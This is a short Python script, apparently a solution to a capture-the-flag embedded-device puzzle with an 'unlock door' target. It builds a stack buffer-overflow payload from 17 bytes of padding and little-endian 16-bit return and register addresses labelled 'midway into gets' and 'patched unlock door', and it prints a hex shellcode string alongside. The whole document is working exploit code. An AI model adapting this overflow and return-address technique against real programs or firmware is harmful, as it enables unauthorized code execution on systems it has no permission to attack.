import struct
def strhex(s):
	return " ".join("{:02x}".format(ord(c)) for c in s)
	
def endian(addr):
	return strhex(struct.pack("H",addr))

buffer_len = 17;

shell = "0f12 3012 7f"

password = strhex("A"*buffer_len) + " "
password += endian(0x4654) #midway into gets
password += endian(0x445a)#r15 location
password += strhex("AA") #r14 #len
password += endian(0x4446) #patched unlock door

print("pass: " + password)
print("shell: " + shell)